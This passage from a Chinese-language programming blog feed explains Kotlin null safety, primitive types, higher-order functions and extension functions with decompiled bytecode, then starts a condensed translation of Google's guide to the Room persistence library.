kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a:<span class="built_in">Int</span>? = <span class="literal">null</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">val</span> mStr = a?.toString() ?: <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="keyword">val</span> mStr = <span class="keyword">if</span>(a!=<span class="literal">null</span>) a.toString() <span class="keyword">else</span> <span class="string">""</span></span><br></pre></td></tr></table></figure><p>也可以在右边写 return、throw 语句，</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> mStr = a?.toString() ?: <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> mStr = a?.toString() ?: <span class="keyword">throw</span> IllegalStateException()</span><br></pre></td></tr></table></figure><ul><li>强制cast 为非null类型 <code>!!</code></li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a : <span class="built_in">Int</span> ? = <span class="literal">null</span></span><br><span class="line">a!!.toString()</span><br></pre></td></tr></table></figure><p>编译期不会检查null类型了。但是在运行期一样会抛出异常，所以这种写法是治标不治本。</p><p>在Android studio中使用自动转化功能生成的kotlin代码，到处都是这种<code>!!</code></p><p><img src="/media/14974529407822.jpg" alt=""></p><p>去掉<code>!!</code>可以用以下几个策略：</p><p>1.使用 val 代替 var</p><p>强迫自己尽可能的使用不可变量。如果是可变变量，它在运行时有可能被赋值为null。</p><p>2.使用 lateinit</p><p>Android中许多变量需要在onCreate中初始化，这时可以使用 lateinit 修饰属性。</p><p>访问未初始化的变量将抛出<code>UninitializedPropertyAccessException</code>。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> mAdapter: RecyclerAdapter&lt;Transaction&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">    mAdapter = RecyclerAdapter(R.layout.item_transaction)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">updateTransactions</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mAdapter.notifyDataSetChanged()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于基础数据类型Int、Double，lateinit 不能使用，可以用delegates</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">var</span> mNumber: <span class="built_in">Int</span> <span class="keyword">by</span> Delegates.notNull&lt;<span class="built_in">Int</span>&gt;()</span><br></pre></td></tr></table></figure><p>3.使用 <code>let</code> function</p><p><img src="/media/14974534516687.jpg" alt=""></p><p>let是kotlin std中自带的几个顶层函数，经常和安全操作符<code>?.</code>配合使用。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">var</span> mPhotoUrl: String? = <span class="literal">null</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">uploadClicked</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mPhotoUrl?.let &#123; uploadPhoto(it) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.自定义 <code>let</code> function</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (mUserName != <span class="literal">null</span> &amp;&amp; mPhotoUrl != <span class="literal">null</span>) &#123;</span><br><span class="line">   uploadPhoto(mUserName!!, mPhotoUrl!!)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以模仿let写一个函数ifNotNull，这个函数接收带有两个参数的lambda类型。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;T1, T2&gt;</span> <span class="title">ifNotNull</span><span class="params">(value1: <span class="type">T1</span>?, value2: <span class="type">T2</span>?, bothNotNull: (<span class="type">T1</span>, T2)</span></span> -&gt; (<span class="built_in">Unit</span>)) &#123;</span><br><span class="line">   <span class="keyword">if</span> (value1 != <span class="literal">null</span> &amp;&amp; value2 != <span class="literal">null</span>) &#123;</span><br><span class="line">       bothNotNull(value1, value2)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用如下</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">ifNotNull(mUserName, mPhotoUrl) &#123;</span><br><span class="line">   userName, photoUrl -&gt;</span><br><span class="line">   uploadPhoto(userName, photoUrl)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.使用 Elvis operator</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getUserName</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">   <span class="keyword">if</span> (mUserName != <span class="literal">null</span>) &#123;</span><br><span class="line">       <span class="keyword">return</span> mUserName!!</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"Anonymous"</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变成</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getUserName</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">   <span class="keyword">return</span> mUserName ?: <span class="string">"Anonymous"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6.just crash</p><p>有时候 crash 也是必需的，但是除了直接抛<code>KotlinNullPointerException</code>，还可以用<code>requireNotNull</code> 或者 <code>checkNotNull</code> 封装异常信息。比如：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">uploadPhoto(intent.getStringExtra(<span class="string">"PHOTO_URL"</span>)!!)</span><br></pre></td></tr></table></figure><p>去掉<code>!!</code>, 把Crash Exception封装下：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">uploadPhoto(requireNotNull(intent.getStringExtra(<span class="string">"PHOTO_URL"</span>), &#123; <span class="string">"Activity parameter 'PHOTO_URL' is missing"</span> &#125;))</span><br></pre></td></tr></table></figure><p>查看kotlin编译出来的bytecode 就可以知道，这个 null check的特性是付出了代价的。在每次调用有非空参数的函数时、或者返回非空值的return语句前，都插入了下面一条类似这样的命令<code>Intrinsics.checkXXXXIsNotNull</code>，自动帮我们check了一遍非空。</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INVOKESTATIC kotlin/jvm/internal/Intrinsics.checkParameterIsNotNull (Ljava/lang/Object;Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><h3 id="2-没有primitive-数据类型">2. 没有primitive 数据类型</h3><p>Java 认为万物都是对象，并创建了 Object 这个顶层类，但是primitive数据类型单独处理。</p><blockquote><p>“凡动物一律平等<br>但是有些动物比别的动物更加平等”<br>——From: 乔治·奥威尔(George Orwell). 《动物农场》.</p></blockquote><ul><li>primitive 存储在local stack空间，Object存储在 heap 空间</li><li>primitive 作为参数是传值，Object作为参数是传引用</li></ul><p>为了打通 primitive 数据类型和 Object，Java使用了一个包装类型作为bridge，使得这两个类型之间可以自动转化。</p><p>kotlin 的类型系统直接舍弃了 primitive 数据类型，真正意义上的万物都是对象。</p><p>在kotlin中可以直接在数据类型上调用、定义方法。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">println(<span class="number">1498621482L</span>.toDateString())</span><br><span class="line"><span class="comment">//（`toDateString`是`Long`的自定义拓展方法）</span></span><br></pre></td></tr></table></figure><p>除此之外 Int 到 Long 到 Double的转化必须显式调用<code>toXXXX()</code>。<br>kotlin的数据类型底层仍然是primitive数据：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> b = <span class="number">1L</span></span><br></pre></td></tr></table></figure><p>反编译为Bytecode，再翻译为Java如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> b = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">getB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-first-class-method">3. first-class method</h3><p>在kotlin中，可以把函数作为参数、返回值，也就是说，我们可以在kotlin中写高阶函数了。为了实现这个特性，kotlin提出了函数类型 <code>() -&gt; Type</code> ，类似OC中的block。举例说明</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">trace</span><span class="params">(sectionName: <span class="type">String</span>, body: ()</span></span> -&gt; <span class="built_in">Unit</span>)&#123;</span><br><span class="line">    Trace.beginSection(sectionName)</span><br><span class="line">    body()</span><br><span class="line">    Trace.endSection()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>body</code>就是一个函数类型参数。</p><p>另外kotlin可以像Java8中的一样将lambda表达式赋值给java版的SAM-interface，或者赋值给kotlin的函数类型变量。</p><p>还是上面的例子，调用trace方法</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">trace(<span class="string">"render"</span>,&#123;</span><br><span class="line">  initView()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当lambda是最后（或唯一）一个参数时，可以把lambda大括号移到括号外面来。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">trace(<span class="string">"render"</span>) &#123;</span><br><span class="line">  initView()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样简化有两个好处</p><ol><li>减少括号的层级。</li><li>可以用kotlin直接写出类似DSL的声明式代码。例如，封装下okhttp，调用get时可以这样写：</li></ol><pre><code><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> &#123;</span><br><span class="line">onSuccess = ...</span><br><span class="line">onError = ...</span><br><span class="line">header = ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><h3 id="4-扩展函数-属性">4. 扩展函数、属性</h3><p>OCP</p><blockquote><p>Software entities should be open for extension,but closed for modification<br>对扩展是开放的，对修改是关闭的</p></blockquote><p>大多数Java项目，一定有一个或多个Utils类，里面一堆静态方法。当不确定某个helper方法写到哪儿时,new 一个Utils类太有诱惑力了。大家理直气壮地说，JDK也是这么干的，你看java.utils.**包下的都是这样写的啊。</p><p>Utils类为什么不好：</p><ol><li>不符合OOP</li><li>不符合SOLID中的OCP、SRP原则</li><li>静态方法对单元测试不友好</li></ol><p><img src="/media/14987391775306.jpg" alt=""></p><p>不写Utils类，不用继承和组合，静态语言还能能像动态语言那样动态的扩展库函数吗？能。</p><p>在Objective-C中可以通过category给一个类增加方法，甚至覆盖方法。在kotlin中的扩展和OC的类似，但又有点区别。</p><ul><li>扩展属性</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">var</span> TextView.text: CharSequence</span><br><span class="line"><span class="keyword">get</span>() = getText()</span><br><span class="line"><span class="keyword">set</span>(v) = setText(v)</span><br></pre></td></tr></table></figure><ul><li>扩展函数</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="built_in">Long</span>.<span class="title">toDateString</span><span class="params">(dateFormat: <span class="type">Int</span> = DateFormat.MEDIUM)</span></span>: String &#123;</span><br><span class="line">    <span class="keyword">val</span> df = DateFormat.getDateInstance(dateFormat, Locale.getDefault())</span><br><span class="line">    <span class="keyword">return</span> df.format(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用代码</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">println(<span class="number">1498621482L</span>.toDateString())</span><br></pre></td></tr></table></figure><p>不像OC修改了meta类的方法list，kotlin扩展特性的实现原理其实很简单。</p><p>上面的<code>toDateString</code> “反编译”为Java代码后</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtentionUtilsKt</span> </span>&#123;</span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="keyword">public</span> static <span class="keyword">final</span> String toDateString(long $receiver, int dateFormat) &#123;</span><br><span class="line">      DateFormat df = DateFormat.getDateInstance(dateFormat, Locale.getDefault());</span><br><span class="line">      String var10000 = df.format(<span class="built_in">Long</span>.valueOf($receiver));</span><br><span class="line">      Intrinsics.checkExpressionValueIsNotNull(var10000, <span class="string">"df.format(this)"</span>);</span><br><span class="line">      <span class="keyword">return</span> var10000;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实和我们自己写Utils静态方法一模一样。可以看出，kotlin的扩展属性就是语法糖。<br>当然，这种实现可以理解的，毕竟Java本身都没法舍弃Utils。kotlin没有重新实现一个Java，它只是在bytecode的基础上，提供了新的语法糖。</p><p>在了解实现细节后，显然，下面两个关于动态扩展的局限就很好理解了：</p><ol><li>当扩展函数和成员函数有相同的函数签名时（override），成员函数优先于扩展函数。</li><li>扩展函数是静态分发的，总是使用函数的声明类型来决定调用哪个扩展函数</li></ol><p>第一条，我们没有修改扩展类receiver的类结构，在调用同签名函数时，编译期会先查找receiver自己的方法表，只有没找到时，才会调用成Utils的静态方法。</p><p>第二条，看下面例子</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>: <span class="type">C</span></span>()</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">fun</span> C.<span class="title">foo</span><span class="params">()</span></span> = <span class="string">"c"</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">fun</span> D.<span class="title">foo</span><span class="params">()</span></span> = <span class="string">"d"</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">printFoo</span><span class="params">(c: <span class="type">C</span>)</span></span> &#123;</span><br><span class="line">   println(c.foo())</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">printFoo(D()) <span class="comment">//c</span></span><br></pre></td></tr></table></figure><p>输出c，为什么不是d，这里不是子类型多态吗，难道多态在kotlin中不生效了？<br>验证一下，复写<code>toString</code>方法</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">toString</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"C"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> : <span class="type">C</span></span>() &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">toString</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"D"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> C.<span class="title">foo</span><span class="params">()</span></span> = <span class="string">"c"</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">fun</span> D.<span class="title">foo</span><span class="params">()</span></span> = <span class="string">"d"</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">printFoo</span><span class="params">(c: <span class="type">C</span>)</span></span> &#123;</span><br><span class="line">   println(c.foo())</span><br><span class="line">   println(c)</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">printFoo(D()) </span><br><span class="line"><span class="comment">//c</span></span><br><span class="line"><span class="comment">//D</span></span><br></pre></td></tr></table></figure><p><code>println(c)</code>输出了正确的结果。</p><p>Java的多态是采用方法动态绑定的实现，在编译后，<code>toString</code>方法调用被编码成通过<code>invokevirtual</code>指令调用，<code>invokevirtual</code>会在运行时，去方法表里找对应的方法引用，而此时<code>c</code>中<code>toString</code>指向的是 D.toString 的实现，所以输出D不奇怪。</p><p>同样可以解释为什么<code>foo</code>输出的却是<code>c</code>。kotlin中的扩展函数，最终还是变成了某个Utils类中的静态方法，而静态方法的调用是静态绑定的，具体实现是使用<code>invokestatic</code>指令，在编译期，该指令就知道调用方法的引用情况了，具体看下面的Java代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">foo</span><span class="params">(@NotNull C $receiver)</span> </span>&#123;</span><br><span class="line">      Intrinsics.checkParameterIsNotNull($receiver, <span class="string">"$receiver"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"c"</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">printFoo</span><span class="params">(@NotNull C c)</span> </span>&#123;</span><br><span class="line">      Intrinsics.checkParameterIsNotNull(c, <span class="string">"c"</span>);</span><br><span class="line">      String var1 = foo(c);</span><br><span class="line">      System.out.println(var1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="5-to-be-continued">5. to be continued…</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的特性如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nullsafety&lt;/li&gt;
&lt;li&gt;primitive is Object too&lt;/li&gt;
&lt;li&gt;first-class method&lt;/li&gt;
&lt;li&gt;扩展函数、属性&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>[简译]Google 官方 App 架构 Guide(6)</title>
    <link href="https://deskid.github.io/2017/06/20/Guide-to-App-Architecture-6/"/>
    <id>https://deskid.github.io/2017/06/20/Guide-to-App-Architecture-6/</id>
    <published>2017-06-19T16:29:47.000Z</published>
    <updated>2018-11-14T03:32:22.784Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍Architecture Components中的Room组件</p><a id="more"></a><h2 id="room-persistence-library">Room Persistence Library</h2><p>Room 在 SQLite 的基础上提供了一个抽象层（可以理解为官方的ORM）。</p><p>尽管Android系统内建支持了功能强大的裸SQL查询语句，但是这些API太底层了，使用起来总是需要各种封装。</p><ul><li>裸SQL语句没有编译期检查，重构数据库底层后，更新数据查询语句既耗时又很容易出错。</li><li>在SQL查询结果和Java Object之间转化需要写一堆胶水代码。</li></ul><p>Room 分为三大部分：</p><ul><li><strong>@Database:</strong> database holder，定义了数据库的DAO，同时也是数据库连接的主入口。被<code>Database</code>标注的类需要为继承<code>RoomDatabase</code>的抽象类。运行时通过<code>Room.databaseBuilder()</code> or <code>Room.inMemoryDatabaseBuilder()</code>获取实例</li><li><strong>Entity:</strong> 数据库表行数据结构。每个entity对应一个表。通过<code>Database</code>的<code>entities()</code>来获取entity引用。</li><li><strong>DAO:</strong> Data Access Object (DAO). DAO定义了获取数据的方法。<code>Database</code>中必须包含返回<code>@Dao</code>类的无参抽象方法。在编译期间Room会自动生成相应实现代码。</li></ul><!-- more --><p><img src="/media/room_architecture.png" alt=""></p><p><strong>Figure 1.</strong> Room architecture diagram</p><p>App通过Room database来获取DAO，然后通过DAO获取数据库中的entities，对entities的修改会同步到数据库。</p><p>show me the code</p><p>User.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PrimaryKey</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> uid;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ColumnInfo</span>(name = <span class="string">"first_name"</span>)</span><br><span class="line">    <span class="keyword">private</span> String firstName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ColumnInfo</span>(name = <span class="string">"last_name"</span>)</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and setters are ignored for brevity,</span></span><br><span class="line">    <span class="comment">// but they're required for Room to work.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserDao.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user"</span>)</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE uid IN (:userIds)"</span>)</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">loadAllByIds</span><span class="params">(<span class="keyword">int</span>[] userIds)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE first_name LIKE :first AND "</span></span><br><span class="line">           + <span class="string">"last_name LIKE :last LIMIT 1"</span>)</span><br><span class="line">    <span class="function">User <span class="title">findByName</span><span class="params">(String first, String last)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insertAll</span><span class="params">(User... users)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(User user)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AppDatabase.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Database</span>(entities = &#123;User.class&#125;, version = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AppDatabase</span> <span class="keyword">extends</span> <span class="title">RoomDatabase</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> UserDao <span class="title">userDao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在APP中获取database引用:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppDatabase db = Room.databaseBuilder(getApplicationContext(),</span><br><span class="line">        AppDatabase.class, <span class="string">"database-name"</span>).build();</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 这里尽可能使用单例设计模式，<code>RoomDatabase</code>实例开销很大.</p><h3 id="entities">Entities</h3><p>所有在注解<code>@Database</code>的<code>entities</code>属性中引用到的<code>@Entity</code>类，Room都会创建一个对应的数据库表。<br>默认，<code>@Entity</code>类的所有<code>field</code>对应一个数据库的column，除非被用<code>@Ignore</code>修饰。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@Entity</span><br><span class="line">class User &#123;</span><br><span class="line">    @PrimaryKey</span><br><span class="line">    public int id;</span><br><span class="line"></span><br><span class="line">    public String firstName;</span><br><span class="line">    public String lastName;</span><br><span class="line"></span><br><span class="line"><span class="addition">+    @Ignore</span></span><br><span class="line"><span class="addition">+    Bitmap picture;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无论是public可见，还是提供setter、getter，被持久化的field必须是可以被accessed的。</p><h4 id="primarykey">@PrimaryKey</h4><ul><li><p>每个Entity必须至少有一个primary key（即使Entity只有一个field）。</p></li><li><p>自增ID：使用<code>@PrimaryKey</code>的<code>autoGenerate</code> 属性</p></li><li><p>组合主键：使用<code>@Entity</code>的<code>primaryKeys</code> 属性</p></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span>(primaryKeys = &#123;<span class="string">"firstName"</span>, <span class="string">"lastName"</span>&#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String firstName;</span><br><span class="line">    <span class="keyword">public</span> String lastName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Ignore</span></span><br><span class="line">    Bitmap picture;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>数据库表名：<br>Room默认使用类名作为数据库表名，自定义表名可以使用<code>@Entity</code>的<code>tableName</code>属性</li></ul><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ @Entity(tableName = "users")</span></span><br><span class="line">class User &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> SQLite表名是大小写敏感的</p><ul><li>数据库字段名：<br>Room 默认使用 field 名作为字段名，自定义字段名可以使用<code>@ColumnInfo</code> 注解</li></ul><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@Entity(tableName = "users")</span><br><span class="line">class User &#123;</span><br><span class="line">    @PrimaryKey</span><br><span class="line">    public int id;</span><br><span class="line"></span><br><span class="line"><span class="addition">+   @ColumnInfo(name = "first_name")</span></span><br><span class="line">    public String firstName;</span><br><span class="line"></span><br><span class="line">    @ColumnInfo(name = "last_name")</span><br><span class="line">    public String lastName;</span><br><span class="line"></span><br><span class="line">    @Ignore</span><br><span class="line">    Bitmap picture;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="索引-和-唯一性约束">索引 和 唯一性约束</h4><ul><li>索引： <code>@Entity</code>标注的<code>indices</code>属性。</li></ul><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ @Entity(indices = &#123;@Index("name"), @Index("last_name", "address")&#125;)</span></span><br><span class="line">class User &#123;</span><br><span class="line">    @PrimaryKey</span><br><span class="line">    public int id;</span><br><span class="line"></span><br><span class="line">    public String firstName;</span><br><span class="line">    public String address;</span><br><span class="line"></span><br><span class="line">    @ColumnInfo(name = "last_name")</span><br><span class="line">    public String lastName;</span><br><span class="line"></span><br><span class="line">    @Ignore</span><br><span class="line">    Bitmap picture;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>唯一性约束：设置<code>@Index</code>注解的<code>unique</code>属性为<code>true</code>。</li></ul><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@Entity(indices = &#123;@Index(value = &#123;"first_name", "last_name"&#125;,</span><br><span class="line"><span class="addition">+        unique = true)&#125;)</span></span><br><span class="line">class User &#123;</span><br><span class="line">    @PrimaryKey</span><br><span class="line">    public int id;</span><br><span class="line"></span><br><span class="line">    @ColumnInfo(name = "first_name")</span><br><span class="line">    public String firstName;</span><br><span class="line"></span><br><span class="line">    @ColumnInfo(name = "last_name")</span><br><span class="line">    public String lastName;</span><br><span class="line"></span><br><span class="line">    @Ignore</span><br><span class="line">    Bitmap picture;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="关系">关系</h4><p>大多数ORM允许Entity之间互相引用，Room却明确的禁止。</p><p>Room使用外链约束<code>@ForeignKey</code>来定义Entity之间的关系。</p><p>举个例子，<code>Book</code> 和 <code>User</code> 之间的关系。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span>(foreignKeys = <span class="meta">@ForeignKey</span>(entity = User.class,</span><br><span class="line">                                  parentColumns = <span class="string">"id"</span>,</span><br><span class="line">                                  childColumns = <span class="string">"user_id"</span>))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PrimaryKey</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> bookId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ColumnInfo</span>(name = <span class="string">"user_id"</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> userId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>外链虽然提供了强大的关系约束，但是使用不当也容易造成冲突。为了避免冲突，往往需要添加额外的信息，比如<code>@ForeignKey</code>的<code>onDelete=CASCADE</code>可以级联删除。要注意的是<code>@Insert(OnConflict=REPLACE)</code>做了remove、update一系列操作，而不是简单的update，可能会破坏外链约束。</p><h4 id="嵌套的objects">嵌套的objects</h4><p>有时，我们会想用一个 entity 或者来 pojo 